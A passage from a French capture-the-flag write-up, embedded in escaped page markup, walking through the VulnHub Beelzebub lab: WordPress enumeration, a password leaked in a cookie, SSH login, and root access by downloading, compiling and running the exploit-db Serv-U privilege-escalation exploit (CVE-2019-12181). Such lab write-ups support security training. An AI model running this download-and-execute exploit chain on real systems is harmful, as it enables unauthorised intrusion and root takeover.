\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003EStatus: \u003Cspan class=\"token number\"\u003E200\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E \u003Cspan class=\"token punctuation\"\u003E[\u003C\u002Fspan\u003ESize: \u003Cspan class=\"token number\"\u003E57718\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E]\u003C\u002Fspan\u003E\n\u002Fwp-content           \u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003EStatus: \u003Cspan class=\"token number\"\u003E301\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E \u003Cspan class=\"token punctuation\"\u003E[\u003C\u002Fspan\u003ESize: \u003Cspan class=\"token number\"\u003E350\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E]\u003C\u002Fspan\u003E \u003Cspan class=\"token punctuation\"\u003E[\u003C\u002Fspan\u003E--\u003Cspan class=\"token operator\"\u003E\u003E\u003C\u002Fspan\u003E http:\u002F\u002F192.168.1.31\u002Fd18e1e22becbd915b45e0e655429d487\u002Fwp-content\u002F\u003Cspan class=\"token punctuation\"\u003E]\u003C\u002Fspan\u003E\n\u002Fwp-login.php         \u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003EStatus: \u003Cspan class=\"token number\"\u003E200\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E \u003Cspan class=\"token punctuation\"\u003E[\u003C\u002Fspan\u003ESize: \u003Cspan class=\"token number\"\u003E5694\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E]\u003C\u002Fspan\u003E                                                                      \n\u002Flicense.txt          \u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003EStatus: \u003Cspan class=\"token number\"\u003E200\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E \u003Cspan class=\"token punctuation\"\u003E[\u003C\u002Fspan\u003ESize: \u003Cspan class=\"token number\"\u003E19935\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E]\u003C\u002Fspan\u003E                                                                     \n\u002Fwp-includes          \u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003EStatus: \u003Cspan class=\"token number\"\u003E301\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E \u003Cspan class=\"token punctuation\"\u003E[\u003C\u002Fspan\u003ESize: \u003Cspan class=\"token number\"\u003E351\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E]\u003C\u002Fspan\u003E \u003Cspan class=\"token punctuation\"\u003E[\u003C\u002Fspan\u003E--\u003Cspan class=\"token operator\"\u003E\u003E\u003C\u002Fspan\u003E http:\u002F\u002F192.168.1.31\u002Fd18e1e22becbd915b45e0e655429d487\u002Fwp-includes\u002F\u003Cspan class=\"token punctuation\"\u003E]\u003C\u002Fspan\u003E\n\u002Freadme.html          \u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003EStatus: \u003Cspan class=\"token number\"\u003E200\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E \u003Cspan class=\"token punctuation\"\u003E[\u003C\u002Fspan\u003ESize: \u003Cspan class=\"token number\"\u003E7368\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E]\u003C\u002Fspan\u003E                                                                       \n\u002Fwp-admin             \u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003EStatus: \u003Cspan class=\"token number\"\u003E301\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E \u003Cspan class=\"token punctuation\"\u003E[\u003C\u002Fspan\u003ESize: \u003Cspan class=\"token number\"\u003E348\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E]\u003C\u002Fspan\u003E \u003Cspan class=\"token punctuation\"\u003E[\u003C\u002Fspan\u003E--\u003Cspan class=\"token operator\"\u003E\u003E\u003C\u002Fspan\u003E http:\u002F\u002F192.168.1.31\u002Fd18e1e22becbd915b45e0e655429d487\u002Fwp-admin\u002F\u003Cspan class=\"token punctuation\"\u003E]\u003C\u002Fspan\u003E   \n\u002Fxmlrpc.php           \u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003EStatus: \u003Cspan class=\"token number\"\u003E405\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E \u003Cspan class=\"token punctuation\"\u003E[\u003C\u002Fspan\u003ESize: \u003Cspan class=\"token number\"\u003E42\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E]\u003C\u002Fspan\u003E \u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003EApparement, on est sur un r√©pertoire du CMS \u003Cstrong\u003EWordpress\u003C\u002Fstrong\u003E.\u003C\u002Fp\u003E\n\u003Cp\u003EDans le r√©pertoire \"\u002Fd18e1e22becbd915b45e0e655429d487\u002Fwp-content\u002Fuploads\"\u002F il y a 2 dossiers, \"2021\" et \"Talk To VALAK\". Dans ce second dossier, on arrive une page Web qui nous demande de saisir un nom. En soumettant le formulaire (bouton \"Say Hi to VALAK\"), on trouve un √©ventuel mot de passe dans le cookie de la requ√™te POST.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E\u003Cspan class=\"token function\"\u003Ecurl\u003C\u002Fspan\u003E -i -d \u003Cspan class=\"token string\"\u003E'name=john'\u003C\u002Fspan\u003E http:\u002F\u002F\u003Cspan class=\"token variable\"\u003E$IP\u003C\u002Fspan\u003E\u002Fd18e1e22becbd915b45e0e655429d487\u002Fwp-content\u002Fuploads\u002FTalk%20To%20VALAK\u002Findex.php\nSet-Cookie: \u003Cspan class=\"token assign-left variable\"\u003EPassword\u003C\u002Fspan\u003E\u003Cspan class=\"token operator\"\u003E=\u003C\u002Fspan\u003EM4k3Ad3a1\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003EIl nous manque l'utilisateur de cet √©ventuel mot de passe.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003Ewpscan --url http:\u002F\u002F\u003Cspan class=\"token variable\"\u003E$IP\u003C\u002Fspan\u003E\u002Fd18e1e22becbd915b45e0e655429d487 -e u --ignore-main-redirect --force\n\u003Cspan class=\"token punctuation\"\u003E[\u003C\u002Fspan\u003E+\u003Cspan class=\"token punctuation\"\u003E]\u003C\u002Fspan\u003E valak\n \u003Cspan class=\"token operator\"\u003E|\u003C\u002Fspan\u003E Found By: Author Id Brute Forcing - Author Pattern \u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003EAggressive Detection\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E\n \u003Cspan class=\"token operator\"\u003E|\u003C\u002Fspan\u003E Confirmed By: Login Error Messages \u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003EAggressive Detection\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E\n\n\u003Cspan class=\"token punctuation\"\u003E[\u003C\u002Fspan\u003E+\u003Cspan class=\"token punctuation\"\u003E]\u003C\u002Fspan\u003E krampus\n \u003Cspan class=\"token operator\"\u003E|\u003C\u002Fspan\u003E Found By: Author Id Brute Forcing - Author Pattern \u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003EAggressive Detection\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E\n \u003Cspan class=\"token operator\"\u003E|\u003C\u002Fspan\u003E Confirmed By: Login Error Messages \u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003EAggressive Detection\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Ch2\u003EP√©n√©tration\u003C\u002Fh2\u003E\n\u003Cp\u003EOn arrive √† se connecter au serveur avec le second utilisateur.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ \u003Cspan class=\"token function\"\u003Essh\u003C\u002Fspan\u003E krampus@\u003Cspan class=\"token variable\"\u003E$IP\u003C\u002Fspan\u003E\npassword: M4k3Ad3a1\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Ch2\u003EEscalation\u003C\u002Fh2\u003E\n\u003Cp\u003EDans le r√©pertoire courant de l'utilisateur, on retrouve un historique des commandes int√©ressantes dont celle ci-dessous.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E\u003Cspan class=\"token function\"\u003Ecat\u003C\u002Fspan\u003E .bash_history\n\u003Cspan class=\"token function\"\u003Ewget\u003C\u002Fspan\u003E https:\u002F\u002Fwww.exploit-db.com\u002Fdownload\u002F47009\n\u003Cspan class=\"token function\"\u003Emv\u003C\u002Fspan\u003E \u003Cspan class=\"token number\"\u003E47009\u003C\u002Fspan\u003E .\u002Fexploit.c\ngcc exploit.c -o exploit\n.\u002Fexploit\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003EElle nous indique l'exploit √† utiliser, \"CVE-2019-12181 : Serv-U FTP Server &#x3C; 15.1.7 - Local Privilege Escalation\".\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ \u003Cspan class=\"token builtin class-name\"\u003Ecd\u003C\u002Fspan\u003E \u002Ftmp\n$ \u003Cspan class=\"token function\"\u003Ewget\u003C\u002Fspan\u003E https:\u002F\u002Fwww.exploit-db.com\u002Fdownload\u002F47009 -O exploit.c\n$ gcc exploit.c -o exploit\n$ .\u002Fexploit\n\n\u003Cspan class=\"token assign-left variable\"\u003Euid\u003C\u002Fspan\u003E\u003Cspan class=\"token operator\"\u003E=\u003C\u002Fspan\u003E\u003Cspan class=\"token number\"\u003E0\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Eroot\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E \u003Cspan class=\"token assign-left variable\"\u003Egid\u003C\u002Fspan\u003E\u003Cspan class=\"token operator\"\u003E=\u003C\u002Fspan\u003E\u003Cspan class=\"token number\"\u003E0\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Eroot\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E \u003Cspan class=\"token assign-left variable\"\u003Egroups\u003C\u002Fspan\u003E\u003Cspan class=\"token operator\"\u003E=\u003C\u002Fspan\u003E\u003Cspan class=\"token number\"\u003E0\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Eroot\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E,4\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Eadm\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E,24\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Ecdrom\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E,30\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Edip\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E,33\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Ewww-data\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E,46\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Eplugdev\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E,116\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Elpadmin\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E,126\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Esambashare\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E,1000\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Ekrampus\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E\nopening root shell\n\u003Cspan class=\"token comment\"\u003E# id\u003C\u002Fspan\u003E\n\u003Cspan class=\"token assign-left variable\"\u003Euid\u003C\u002Fspan\u003E\u003Cspan class=\"token operator\"\u003E=\u003C\u002Fspan\u003E\u003Cspan class=\"token number\"\u003E0\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Eroot\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E \u003Cspan class=\"token assign-left variable\"\u003Egid\u003C\u002Fspan\u003E\u003Cspan class=\"token operator\"\u003E=\u003C\u002Fspan\u003E\u003Cspan class=\"token number\"\u003E0\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Eroot\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E \u003Cspan class=\"token assign-left variable\"\u003Egroups\u003C\u002Fspan\u003E\u003Cspan class=\"token operator\"\u003E=\u003C\u002Fspan\u003E\u003Cspan class=\"token number\"\u003E0\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Eroot\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E,4\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Eadm\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E,24\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Ecdrom\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E,30\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Edip\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E,33\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Ewww-data\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E,46\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Eplugdev\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E,116\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Elpadmin\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E,126\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Esambashare\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E,1000\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Ekrampus\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003EEt on trouve facilement le flag root.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ \u003Cspan class=\"token function\"\u003Ecat\u003C\u002Fspan\u003E \u002Froot\u002Froot.txt\n8955qpasq8qq807879p75e1rr24cr1a5\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n","download":"https:\u002F\u002Fwww.vulnhub.com\u002Fentry\u002Fbeelzebub-1,742","tags":[{"title":"Pentest","path":"\u002Ftag\u002FPentest\u002F"},{"title":"CTF","path":"\u002Ftag\u002FCTF\u002F"}],"timeToRead":4,"parts":[]}},"context":{}};(function(){var s;(s=document.currentScript||document.scripts[document.scripts.length-1]).parentNode.removeChild(s);}());</script><script src="/assets/js/app.8917d561.js" defer></script><script src="/assets/js/page--src-templates-post-vue.93f54eeb.js" defer></script>
  </body>
</html>
